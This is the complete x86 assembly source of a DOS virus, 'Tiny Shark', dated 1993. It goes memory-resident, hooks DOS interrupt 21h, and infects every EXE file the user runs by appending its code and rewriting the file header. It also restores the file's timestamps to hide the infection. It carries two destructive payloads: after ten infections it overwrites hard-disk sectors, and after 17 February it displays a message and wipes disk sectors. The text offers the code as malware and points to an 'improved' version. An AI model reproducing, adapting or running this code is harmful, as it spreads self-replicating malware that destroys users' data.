;*******************************************************************************
;*                                                                             *
;*              the    T I N Y    S H A R K     Virus Version 1.0              *
;*                                                                             *
;*                      CopyRight (c) 1993 Italian Boy                         *
;*                                                                             *
;*******************************************************************************

              .model tiny
              .code
              org 100h
@:

copyright     byte       'Made in Italy'


int21_seg     word       ?                   ;segment and ...
int21_ofs     word       ?                   ;offset of int 21
header        byte       1ch dup (0)         ;buffer for header's table
hits          byte       00                  ;infected programs
month         byte       02                  ;month and day of...
x_day         byte       17                  ;nadia's birthday
org13_seg     word       ?
org13_ofs     word       ?                   ;original int 13 adrs
f_handle      word       ?
init_seg      word       ?
old_ss        word       0080h
old_sp        word       0900h
old_ip        word       0000
old_cs        word       0000

; main tools:useful tools and functions used by the virus.

exe_return:
              mov        bx,cs:init_seg
              mov        cx,bx
              add        bx,10h
              add        word ptr cs:old_cs,bx
              mov        ax,cs:old_cs
              mov        word ptr cs:patch+2,ax
              mov        ax,cs:old_ip
              mov        word ptr cs:patch,ax
              add        bx,word ptr cs:old_ss
              cli
              mov        ss,bx
              mov        sp,word ptr cs:old_sp
              sti
              mov        ds,cx
jmp_old_entry:
              byte       0eah

patch         dword      ?

; Chking date for 17 February ,birthday of Nadia.

chk_date:
              mov        ah,2ah              ;calling dos to obtain data
              int        21h
              cmp        dh,month            ;is February?
              jne        no_action
              cmp        dl,x_day            ;is 17 February or above
              jna        no_action
just_do_it:
              stc                            ;yep,do the right thing
              ret
no_action:
              clc                            ;nope,no action for now
              ret
chk_hits:
              cmp        hits,10
              ja         set_smash
              clc
              ret
set_smash:
              stc
              ret
move_fp_down:
              push       cx
              mov        bx,f_handle         ;moving into bx file's handle
              xor        cx,cx
              xor        dx,dx               ;xoring a few registers
              mov        ax,4202h
              int        21h                 ;calling dos
              pop        cx
              ret                            ;return
move_fp_top:
              push       cx
              mov        bx,f_handle         ;moving fp at the file's top
              xor        cx,cx
              xor        dx,dx
              mov        ax,4200h
              int        21h                 ;call dos
              pop        cx
              ret                            ;bye

              byte       'U2'
old13_seg     word       ?
old13_ofs     word       ?

int24_hndl:
              mov        al,03
              iret

old_24_seg    word       ?
old_24_ofs    word       ?

; The main_body proc is the working horse of the virus.This part of code
; provides the most important actions,like tsr-installations,memory check
; and ,naturally,the file's infection.

main_body     proc       near

startup:
              call       relative
relative:
              pop        si
              sub        si,startup-copyright
              sub        si,03
              mov        cs:init_seg,es
chk_virus:
              mov        ax,0fe03h
              int        21h
              cmp        ax,03feh
              je         already
chk_system:
              mov        ah,30h
              int        21h
              cmp        al,03
              jna        already
mcb_manipulation:
              mov        bx,es
              dec        bx
              mov        ds,bx
              xor        di,di
              cmp        byte ptr [di],5ah
              jnz        no_memory
              mov        ax,word ptr ds:[di+03]
              sub        ax,46h
              mov        word ptr ds:[di+03],ax
              sub        word ptr ds:[di+12],0046h
              inc        bx
              add        ax,bx
              mov        es,ax
              push       cs
              pop        ds
              mov        cx,virlength-copyright
              rep        movsb
              sub        ax,0010h
              push       ax
              lea        ax,tsr_startup
              push       ax
              retf
no_memory:
              call       exe_return

              byte       'Prince&NPG'

; now ,we are in high memory

tsr_startup:

get_dos_21:
              mov        ax,3521h
              int        21h
              mov        cs:int21_seg,bx
              mov        cs:int21_ofs,es
hook_dos_21:
              mov        ax,2521h
              lea        dx,v_handler
              push       cs
              pop        ds
              int        21h
chk_hit:
              call       chk_hits
              jc         smash_sector
              call       already
smash_sector:
              mov        ah,2ch
              int        21h
              mov        ah,03
              mov        dl,80h
              mov        dh,01
              mov        al,06
              int        13h
already:
              call       exe_return

; *** V_Handler *** This is the most important part of the virus.It provides
; to infect every .exe file runned by the user.It chk,also,for the validity
; of the file and its conditions.

file_top      word       ?
file_down     word       ?
name_buf      byte       12 dup (0)
date          word       ?
time          word       ?

v_handler:
              cmp        ax,0fe03h
              jne        cont1
i_m_here:
              xchg       ah,al
              iret
cont1:
              cmp        ax,4b00h
              jne        jmp_old21
start_inf_proc:
              push       ax
              push       bx
              push       cx
              push       dx
              push       si
              push       di
              push       bp
              push       es
              push       ds
fuck_exe:
              mov        ax,3d02h
              int        21h
              push       cs
              pop        ds
              mov        f_handle,ax
get_time_date:
              mov        ax,5700h
              mov        bx,f_handle
              int        21h
              mov        date,cx
              mov        time,dx
load_header:
              mov        ah,3fh              ;loading exe's header
              mov        cx,1ch              ;length of header
              lea        dx,header           ;offset of my buffer
              mov        bx,f_handle
              int        21h                 ;call dos
chk_infection:
              cmp        word ptr header[12h],"NS"
              je         do_nothing
chk_legal_exe:
              cmp        word ptr header[00],5a4dh
              jne        do_nothing
chk_time_to_do:
              call       chk_date
              jc         bomb
store_old_table:
              mov        ax,word ptr header[16h]
              mov        cs:old_cs,ax
              mov        ax,word ptr header[0eh]
              mov        cs:old_ss,ax
              mov        ax,word ptr header[14h]
              mov        cs:old_ip,ax
              mov        ax,word ptr header[10h]
              mov        cs:old_sp,ax
              inc        hits
pad_exefile:
              call       move_fp_down
              mov        file_top,dx
              mov        file_down,ax

; STEP ONE:
; Calculating "Trash Bytes".The trash bytes are the unused bytes after the
; file's end on the disk.To align the virus code,we had to fill this bytes
; and to prepare an aligned paragraph.

calc_trash:
              mov        cx,10h              ;div for 10h the file length
              div        cx
              cmp        dx,0
              jz         calc_file_length    ;good luck!no trash bytes..
              mov        ax,10h              ;substracting from 10h the
              sub        ax,dx               ;last file's bytes
              add        file_down,ax

; filling of zeroes the trash bytes

fill_trash:
              mov        cx,ax               ;bytes to fill
              mov        ah,40h              ;writing in the file
              mov        dx,0100h            ;load a few bytes from prog beg
              mov        bx,f_handle
              int        21h               ;call dos

; STEP TWO:
; Calculating new file length and storing it into exe's header

calc_file_length:
              mov        dx,file_top
              mov        ax,file_down
              add        ax,virlength        ;adding trojan length to the file
              adc        dx,00
              mov        cx,0200h            ;dividing by 200h(512)
              div        cx
              inc        ax
              mov        word ptr header[04],ax;storing the new value
              mov        word ptr header[02],dx

; STEP THREE:
; Calcultaing new cs:ip , ss:sp and storing them in header's table

calc_header_size:
              mov        ax,file_down        ;restoring old file's length
              mov        dx,file_top
              mov        cx,0010h            ;make a div by 10h(16)
              div        cx                  ;file's length in paragraphs  of 16
              sub        ax,0010h            ;substracting PSP
              sub        ax,word ptr header[08];substracting header's size
              mov        word ptr header[0eh],ax;new ss
              mov        word ptr header[16h],ax;new cs
              mov        word ptr header[14h],offset startup;new ip
              mov        word ptr header[10h],0a000h;new sp
              mov        word ptr header[12h],"NS"

; STEP FOUR:
; Updating files.This piece of code writes the vir's code at the end of file.

write_vircode:
              mov        ah,40h              ;call dos's writing service
              mov        dx,0100h            ;read datas from over
              mov        cx,virlength        ;write 778 bytes
              mov        bx,f_handle
              int        21h              ;do it!

; STEP FIVE:
; Updating the header's table

write_header:
              call       move_fp_top
              mov        ah,40h              ;call write service
              mov        cx,1ch              ;write 1ch bytes
              lea        dx,header           ;read data from header 's buffer
              mov        bx,f_handle
              int        21h              ;do it!
restore_td:
              mov        cx,date
              mov        dx,time
              mov        ax,5701h
              mov        bx,f_handle
              int        21h
close_file:
              mov        ah,3eh
              mov        bx,f_handle
              int        21h
do_nothing:
              pop        ds
              pop        es
              pop        bp
              pop        di
              pop        si
              pop        dx
              pop        cx
              pop        bx
              pop        ax
jmp_old21:
              jmp        dword ptr cs:int21_seg
              iret

main_body     endp

              byte       'Billy Idol'
bomb:
              push       cs
              pop        es
              mov        ah,13h
              mov        al,00
              mov        bl,4fh
              mov        dh,10
              mov        dl,10
              lea        bp,out_string
              mov        cx,lengthof out_string
              int        10h
crunch_hd:
              xor        dx,dx
              mov        cx,30
              mov        al,02
              int        26h
              jmp        $

out_string    byte       'The Tiny Shark virus was here...(C) Stefano Toria 1993 Rome'

virlength     equ        $

              end        @

; Get the Trickster Source Code . Is an improved version of this virus.
; Italian Boy .


